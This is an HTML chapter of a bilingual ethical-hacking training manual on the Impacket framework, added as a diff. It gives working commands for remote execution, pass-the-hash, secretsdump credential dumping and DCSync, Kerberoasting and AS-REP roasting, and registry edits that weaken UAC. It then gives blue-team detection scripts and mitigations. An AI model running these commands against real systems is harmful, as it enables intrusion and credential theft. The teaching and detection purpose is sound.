@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 13 — Impacket Framework | Ch. 13</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 13 — Impacket Framework</h1>
+<div class="sub">Ch. 13 — Windows Network Exploitation with Impacket</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / AD</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#install">Instalação</a></li><li><a href="#psexec">PSExec</a></li>
+<li><a href="#wmiexec">WMIExec</a></li><li><a href="#smbexec">SMBExec</a></li>
+<li><a href="#secretsdump">SecretsDump</a></li><li><a href="#kerberos">Kerberos Attacks</a></li>
+<li><a href="#impact">Scripts de Impacto</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o Impacket como coleção de classes Python para protocolos de rede; instalar a partir do GitHub ou PyPI; executar comandos remotos com <code class="inline">psexec.py</code>, <code class="inline">wmiexec.py</code>, <code class="inline">smbexec.py</code> e <code class="inline">atexec.py</code>; aplicar o fix de UAC para execução remota; extrair credenciais com <code class="inline">secretsdump.py</code> (SAM, LSA, NTDS, DCSync); realizar Kerberoasting e AS-REP Roasting; <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand Impacket as a collection of Python classes for network protocols; install from GitHub or PyPI; execute remote commands with <code class="inline">psexec.py</code>, <code class="inline">wmiexec.py</code>, <code class="inline">smbexec.py</code>, and <code class="inline">atexec.py</code>; apply the UAC fix for remote execution; extract credentials with <code class="inline">secretsdump.py</code> (SAM, LSA, NTDS, DCSync); perform Kerberoasting and AS-REP Roasting; <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O Impacket é uma coleção de classes Python que fornece acesso programático de baixo nível a protocolos de rede. Ao contrário de muitas ferramentas de segurança com interfaces simples de point-and-click, o Impacket exige uma compreensão mais profunda de protocolos de rede e internals do Windows. Esta curva de aprendizagem é precisamente o que o torna tão poderoso — dá-te capacidades de manipulação de protocolos de rede que podem contornar controlos de segurança tradicionais e mecanismos de deteção. O Impacket implementa dezenas de protocolos incluindo SMB, MSRPC, LDAP e Kerberos. Estas não são simples wrappers, mas implementações completas de raiz. O que distingue o Impacket é o foco em <strong>protocolos legítimos do Windows</strong> em vez de exploits. Esta abordagem permite-te misturar-te com tráfego de rede normal e evitar deteção por sistemas de monitorização focados em padrões de exploit conhecidos.</span>
+<span class="en">Impacket is a collection of Python classes that provides low-level programmatic access to network protocols. Unlike many security tools with simple point-and-click interfaces, Impacket requires a deeper understanding of network protocols and Windows internals. This learning curve is precisely what makes it so powerful — giving you network protocol manipulation capabilities that can bypass traditional security controls and detection mechanisms. Impacket implements dozens of network protocols including SMB, MSRPC, LDAP, and Kerberos. These aren't simple wrappers but complete, from-scratch implementations. What sets Impacket apart is its focus on <strong>legitimate Windows protocols</strong> rather than exploits. This approach allows you to blend in with normal network traffic and avoid detection by security systems focused on known exploit patterns.</span>
+</div>
+</section>
+
+<section id="install">
+<h2>3. Instalação <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Para as funcionalidades mais recentes, instala o Impacket diretamente do repositório GitHub usando um ambiente virtual Python:</span>
+<span class="en">For the latest features, install Impacket directly from the GitHub repository using a Python virtual environment:</span>
+</div>
+<pre>kali> sudo apt install python3.13-venv
+kali> source impacket-env/bin/activate
+kali> cd impacket
+kali> pip install .</pre>
+<div class="lang">
+<span class="pt">Verifica a instalação executando um dos scripts com a flag de ajuda:</span>
+<span class="en">Verify the installation by running one of the scripts with the help flag:</span>
+</div>
+<pre>kali > psexec.py -h</pre>
+<div class="lang">
+<span class="pt">Se a instalação foi bem-sucedida, verás o output de ajuda do <code class="inline">psexec.py</code>, confirmando que o Impacket está pronto a usar.</span>
+<span class="en">If installation was successful, you'll see the help output for <code class="inline">psexec.py</code>, confirming Impacket is ready to use.</span>
+</div>
+</section>
+
+<section id="psexec">
+<h2>4. PSExec — Execução Remota <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">psexec.py</code> é uma implementação Python da utilidade PSExec da Microsoft. Funciona através do <strong>Service Control Manager</strong> do Windows: cria e inicia um serviço temporário no sistema alvo, que executa o comando especificado e devolve o output através de named pipes. Como usa protocolos de administração padrão do Windows, muitas vezes contorna controlos de segurança que bloqueariam outros métodos de execução remota.</span>
+<span class="en"><code class="inline">psexec.py</code> is a Python implementation of Microsoft's PSExec utility. It works through the Windows <strong>Service Control Manager</strong>: it creates and starts a temporary service on the target system, which executes the specified command and returns output through named pipes. Because it uses standard Windows administration protocols, it often bypasses security controls that would block other remote execution methods.</span>
+</div>
+<h3>4.1 Passos / Steps</h3>
+<pre># 1. Identificar o alvo
+kali > nmap -sT <IP>
+
+# 2. Testar conectividade SMB
+kali > smbclient -L //<IP> -U username
+
+# 3. Executar
+kali > psexec.py username@<IP></pre>
+<div class="lang">
+<span class="pt">Se vires os shares <code class="inline">ADMIN$</code>, <code class="inline">C$</code> e <code class="inline">IPC$</code>, a conta tem privilégios administrativos e o PSExec deve funcionar. O erro de SMB1 no final é normal — sistemas modernos desativam SMBv1 por segurança.</span>
+<span class="en">If you see the <code class="inline">ADMIN$</code>, <code class="inline">C$</code>, and <code class="inline">IPC$</code> shares, the account has administrative privileges and PSExec should work. The SMB1 error at the end is normal — modern systems disable SMBv1 for security.</span>
+</div>
+</section>
+
+<section id="wmiexec">
+<h2>5. WMIExec — Execução via WMI <span class="badge orig">Original</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Se o PSExec falhar com um erro de acesso negado ao escrever nos shares administrativos, podes tentar o <code class="inline">wmiexec.py</code>, que usa WMI/DCOM em vez de SMB para criar o processo. O erro <code class="inline">rpc_s_access_denied</code> indica que tens acesso SMB mas falta permissão RPC para WMI — outro problema relacionado com UAC.</span>
+<span class="en">If PSExec fails with access denied when writing to administrative shares, you can try <code class="inline">wmiexec.py</code>, which uses WMI/DCOM instead of SMB to create the process. The <code class="inline">rpc_s_access_denied</code> error indicates you have SMB access but lack RPC permission for WMI — another UAC-related issue.</span>
+</div>
+<h3>5.1 Fix de UAC para Execução Remota / UAC Fix for Remote Execution <span class="badge orig">Original</span></h3>
+<div class="lang">
+<span class="pt">Na máquina Windows, executa como Administrador:</span>
+<span class="en">On the Windows machine, run as Administrator:</span>
+</div>
+<pre># Enable remote admin access for local accounts (fixes PSExec)
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# Disable filtering of the built-in Administrator account (fixes WMIExec)
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /d 0 /f
+
+# Restart to apply
+shutdown /r /t 0</pre>
+<h3>5.2 Uso / Usage</h3>
+<pre>kali > wmiexec.py username@<IP></pre>
+</section>
+
+<section id="smbexec">
+<h2>6. SMBExec — Execução via SMB <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">smbexec.py</code> é outro modelo de execução baseado em serviços. Ao contrário do PSExec, não faz upload de um binário auxiliar para o alvo — usa pipes SMB para enviar comandos e receber output. Isto torna-o ligeiramente mais discreto, embora ainda crie um serviço temporário.</span>
+<span class="en"><code class="inline">smbexec.py</code> is another service-based execution model. Unlike PSExec, it doesn't upload a helper binary to the target — it uses SMB pipes to send commands and receive output. This makes it slightly stealthier, although it still creates a temporary service.</span>
+</div>
+<pre># Basic usage
+smbexec.py DOMAIN/user:password@target
+
+# With hash (pass-the-hash)
+smbexec.py -hashes :NTHASH DOMAIN/user@target
+
+# Specify share and shell type
+smbexec.py DOMAIN/user:password@target -share C$ -shell-type cmd</pre>
+</section>
+
+<section id="secretsdump">
+<h2>7. SecretsDump — Extração de Credenciais <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O <code class="inline">secretsdump.py</code> extrai hashes de password e segredos de sistemas Windows. Pode fazer dump da SAM local, LSA secrets, credenciais em cache, e do NTDS.dit em Domain Controllers via DCSync. É um dos scripts Impacket mais observados em intrusões reais.</span>
+<span class="en"><code class="inline">secretsdump.py</code> extracts password hashes and secrets from Windows systems. It can dump the local SAM, LSA secrets, cached credentials, and the NTDS.dit on Domain Controllers via DCSync. It's one of the most commonly observed Impacket scripts in real-world intrusions.</span>
+</div>
+<pre># SAM/LSA dump (local admin)
+secretsdump.py DOMAIN/user:password@target
+
+# DCSync (Domain Admin required)
+secretsdump.py DOMAIN/user:password@DC_IP -just-dc-ntlm
+
+# Offline NTDS dump
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+
+# With pass-the-hash
+secretsdump.py -hashes :NTHASH DOMAIN/user@target</pre>
+</section>
+
+<section id="kerberos">
+<h2>8. Kerberos Attacks <span class="badge comp">Complementar</span></h2>
+<h3>8.1 Kerberoasting (GetUserSPNs.py)</h3>
+<div class="lang">
+<span class="pt">Identifica contas de serviço com SPN e pede TGS tickets para cracking offline.</span>
+<span class="en">Identifies service accounts with SPN and requests TGS tickets for offline cracking.</span>
+</div>
+<pre>GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile spns.txt
+# Crack: hashcat -m 13100 spns.txt wordlist.txt</pre>
+<h3>8.2 AS-REP Roasting (GetNPUsers.py)</h3>
+<div class="lang">
+<span class="pt">Identifica contas sem pre-autenticação Kerberos e pede AS-REP para cracking offline.</span>
+<span class="en">Identifies accounts without Kerberos pre-authentication and requests AS-REP for offline cracking.</span>
+</div>
+<pre>GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt
+# Crack: hashcat -m 18200 asrep.txt wordlist.txt</pre>
+</section>
+
+<section id="impact">
+<h2>9. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar atividade compatível com Impacket, com output legível e exportação para relatório.</span>
+<span class="en">The scripts below help the blue team detect Impacket-compatible activity, with readable output and report export.</span>
+</div>
+
+<h3>9.1 Script 13.1 — Deteção de Shares Administrativos / Admin Share Access Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar acesso a <code class="inline">ADMIN$</code>, <code class="inline">C$</code> e <code class="inline">IPC$</code> via eventos 5140/5145, especialmente escritas de executáveis. <strong>Evidência:</strong> <code class="inline">admin-share-access.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect access to <code class="inline">ADMIN$</code>, <code class="inline">C$</code>, and <code class="inline">IPC$</code> via events 5140/5145, especially executable writes. <strong>Evidence:</strong> <code class="inline">admin-share-access.csv</code>.</span>
+</div>
+<pre># Script 13.1 - Admin Share Access Detection
+$out = ".\admin-share-access.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
+  Where-Object { $_.Id -in @(5140,5145) } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $share = ($xml.Event.EventData.Data | Where-Object Name -eq "ShareName").'#text'
+    $file  = ($xml.Event.EventData.Data | Where-Object Name -eq "RelativeTargetName").'#text'
+    if ($share -match "ADMIN\$|C\$" -and $file -match "\.(exe|dll|bat|ps1|sys)$") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; EventId=$_.Id; Share=$share; File=$file }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Admin share writes: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>9.2 Script 13.2 — Deteção de Execução Remota / Remote Execution Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar processos criados por serviços (<code class="inline">services.exe</code>) ou WMI (<code class="inline">WmiPrvSE.exe</code>) com linhas de comando suspeitas. <strong>Evidência:</strong> <code class="inline">remote-exec-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect processes created by services (<code class="inline">services.exe</code>) or WMI (<code class="inline">WmiPrvSE.exe</code>) with suspicious command lines. <strong>Evidence:</strong> <code class="inline">remote-exec-detect.csv</code>.</span>
+</div>
+<pre># Script 13.2 - Remote Execution Detection
+$out = ".\remote-exec-detect.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4688 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $parent = ($xml.Event.EventData.Data | Where-Object Name -eq "ParentProcessName").'#text'
+    $proc   = ($xml.Event.EventData.Data | Where-Object Name -eq "NewProcessName").'#text'
+    $cmd    = ($xml.Event.EventData.Data | Where-Object Name -eq "CommandLine").'#text'
+    if (($parent -match "services\.exe|WmiPrvSE\.exe") -and ($cmd -match "cmd|powershell|whoami|ipconfig|net ")) {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Parent=$parent; Process=$proc; Cmd=$cmd }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Remote execution hits: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+
+<h3>9.3 Script 13.3 — Deteção de DCSync / DCSync Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar DCSync via evento 4662 com o GUID de replicação de diretório. <strong>Evidência:</strong> <code class="inline">dcsync-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect DCSync via event 4662 with the directory replication GUID. <strong>Evidence:</strong> <code class="inline">dcsync-detect.csv</code>.</span>
+</div>
+<pre># Script 13.3 - DCSync Detection
+$out = ".\dcsync-detect.csv"
+$replGuid = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4662 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $props = ($xml.Event.EventData.Data | Where-Object Name -eq "Properties").'#text'
+    $user  = ($xml.Event.EventData.Data | Where-Object Name -eq "SubjectUserName").'#text'
+    if ($props -match $replGuid) {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Account=$user; Guid=$replGuid }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] DCSync events: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+</section>
+
+<section id="mitre">
+<h2>10. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Remote Services: SMB/Windows Admin Shares</td><td>T1021.002</td><td>psexec, smbexec, admin shares</td></tr>
+<tr><td>Windows Management Instrumentation</td><td>T1047</td><td>wmiexec</td></tr>
+<tr><td>Scheduled Task/Job</td><td>T1053</td><td>atexec</td></tr>
+<tr><td>OS Credential Dumping: NTDS</td><td>T1003.003</td><td>secretsdump</td></tr>
+<tr><td>OS Credential Dumping: DCSync</td><td>T1003.006</td><td>secretsdump -just-dc</td></tr>
+<tr><td>Steal or Forge Kerberos Tickets: Kerberoasting</td><td>T1558.003</td><td>GetUserSPNs</td></tr>
+<tr><td>Steal or Forge Kerberos Tickets: AS-REP Roasting</td><td>T1558.004</td><td>GetNPUsers</td></tr>
+<tr><td>Adversary-in-the-Middle: LLMNR/NBT-NS &amp; SMB Relay</td><td>T1557.001</td><td>ntlmrelayx</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>11. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Monitorizar acessos a ADMIN$/C$/IPC$</strong> (eventos 5140, 5145) — Script 13.1.</li>
+<li><strong>Alertar sobre processos criados por services.exe/WmiPrvSE.exe</strong> com comandos suspeitos — Script 13.2.</li>
+<li><strong>Detetar DCSync</strong> (evento 4662 com GUID de replicação) — Script 13.3.</li>
+<li><strong>Desativar NTLM</strong> onde possível; exigir SMB signing e LDAP signing.</li>
+<li><strong>Desativar LLMNR/NetBIOS</strong> — mitiga relay e poisoning.</li>
+<li><strong>Restringir Domain Admin</strong> — Tier 0, Protected Users, gMSA para serviços.</li>
+<li><strong>Monitorizar Kerberoasting</strong> — TGS-REQ em volume, especialmente RC4.</li>
+<li><strong>AppLocker/WDAC</strong> — bloquear execução de binários não assinados.</li>
+<li><strong>Segmentação de rede</strong> — limitar movimento lateral.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>12. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> DC Windows Server + VM cliente加入 ao domínio. Snapshot antes. Kali com Impacket instalado. Aplicar o fix de UAC na VM Windows. <strong>Objetivo:</strong> testar psexec, wmiexec, smbexec, secretsdump e Kerberoasting; correr os scripts de deteção.</span>
+<span class="en"><strong>Scenario:</strong> Windows Server DC + domain-joined client VM. Snapshot before. Kali with Impacket installed. Apply the UAC fix on the Windows VM. <strong>Goal:</strong> test psexec, wmiexec, smbexec, secretsdump, and Kerberoasting; run detection scripts.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Fix UAC</td><td><code class="inline">reg add ... LocalAccountTokenFilterPolicy /d 1 /f</code></td><td>Output</td></tr>
+<tr><td>2</td><td>PSExec</td><td><code class="inline">psexec.py user@target</code></td><td>Shell remota</td></tr>
+<tr><td>3</td><td>WMIExec</td><td><code class="inline">wmiexec.py user@target</code></td><td>Shell remota</td></tr>
+<tr><td>4</td><td>SMBExec</td><td><code class="inline">smbexec.py user:pass@target</code></td><td>Shell remota</td></tr>
+<tr><td>5</td><td>SecretsDump (SAM)</td><td><code class="inline">secretsdump.py user:pass@target</code></td><td>Hashes</td></tr>
+<tr><td>6</td><td>Kerberoasting</td><td><code class="inline">GetUserSPNs.py user:pass -dc-ip DC -request</code></td><td><code class="inline">spns.txt</code></td></tr>
+<tr><td>7</td><td>Deteção shares</td><td><code class="inline">.\admin-share-detect.ps1</code></td><td><code class="inline">admin-share-access.csv</code></td></tr>
+<tr><td>8</td><td>Deteção execução</td><td><code class="inline">.\remote-exec-detect.ps1</code></td><td><code class="inline">remote-exec-detect.csv</code></td></tr>
+<tr><td>9</td><td>Deteção DCSync</td><td><code class="inline">.\dcsync-detect.ps1</code></td><td><code class="inline">dcsync-detect.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Shell psexec/wmiexec/smbexec</li>
+<li>Hashes do secretsdump</li>
+<li><code class="inline">spns.txt</code></li>
+<li><code class="inline">admin-share-access.csv</code></li>
+<li><code class="inline">remote-exec-detect.csv</code></li>
+<li><code class="inline">dcsync-detect.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>13. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que o Impacket é considerado furtivo? / Why is Impacket considered stealthy?</li>
+<li>Qual a diferença entre psexec, wmiexec e smbexec? / What's the difference between psexec, wmiexec, and smbexec?</li>
+<li>O que faz o fix de UAC com <code class="inline">LocalAccountTokenFilterPolicy</code>? / What does the UAC fix with <code class="inline">LocalAccountTokenFilterPolicy</code> do?</li>
+<li>O que faz o <code class="inline">secretsdump.py -just-dc-ntlm</code>? / What does <code class="inline">secretsdump.py -just-dc-ntlm</code> do?</li>
+<li>Qual a diferença entre Kerberoasting e AS-REP Roasting? / What's the difference between Kerberoasting and AS-REP Roasting?</li>
+<li>Como se deteta DCSync no blue team? / How to detect DCSync on the blue team?</li>
+<li>Porque é que os shares administrativos são um sinal de deteção? / Why are admin shares a detection signal?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>14. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o Impacket: instalação, execução remota com <code class="inline">psexec.py</code> (SMB service), <code class="inline">wmiexec.py</code> (WMI/DCOM) e <code class="inline">smbexec.py</code> (SMB sem binário), o fix de UAC para execução remota, extração de credenciais com <code class="inline">secretsdump.py</code> (SAM, LSA, NTDS, DCSync), e ataques Kerberos (<code class="inline">GetUserSPNs.py</code> para Kerberoasting, <code class="inline">GetNPUsers.py</code> para AS-REP Roasting). Acrescentámos <strong>três scripts de impacto</strong> (deteção de shares administrativos, execução remota, DCSync) que ajudam o blue team a detetar atividade compatível com Impacket. O Cap. 14 entra no C2 Sliver e movimento lateral.</span>
+<span class="en">This chapter covered Impacket: installation, remote execution with <code class="inline">psexec.py</code> (SMB service), <code class="inline">wmiexec.py</code> (WMI/DCOM), and <code class="inline">smbexec.py</code> (SMB without binary), the UAC fix for remote execution, credential extraction with <code class="inline">secretsdump.py</code> (SAM, LSA, NTDS, DCSync), and Kerberos attacks (<code class="inline">GetUserSPNs.py</code> for Kerberoasting, <code class="inline">GetNPUsers.py</code> for AS-REP Roasting). We added <strong>three impact scripts</strong> (admin share access detection, remote execution, DCSync) that help the blue team detect Impacket-compatible activity. Ch. 14 moves into Sliver C2 and lateral movement.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 13 / Ethical Hacker Training Manual — Ch. 13</div>
+<div style="margin-top:.6rem">
+<a href="cap12.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap14.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
